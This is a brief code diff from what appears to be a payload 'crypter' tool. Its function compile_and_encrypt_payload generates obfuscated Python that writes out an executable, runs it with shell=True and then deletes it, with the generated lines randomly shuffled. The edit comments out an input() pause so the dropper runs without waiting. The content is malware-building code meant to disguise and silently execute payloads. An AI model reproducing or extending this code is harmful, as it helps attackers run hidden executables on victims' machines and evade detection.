@@ -231,7 +231,7 @@ def compile_and_encrypt_payload(payload_path: str, save_path: str):
                 f"{variables[5]}.write({variables[4]})",
                 f"{variables[5]}.close()",
                 f"{variables[8]}.run([r'{variables[6]}.exe'], shell=True)",
-                f"input()",
+                # f"input()",
                 f"{variables[9]}.remove(r'{variables[6]}.exe')",
             ]
             np.random.shuffle(lines)
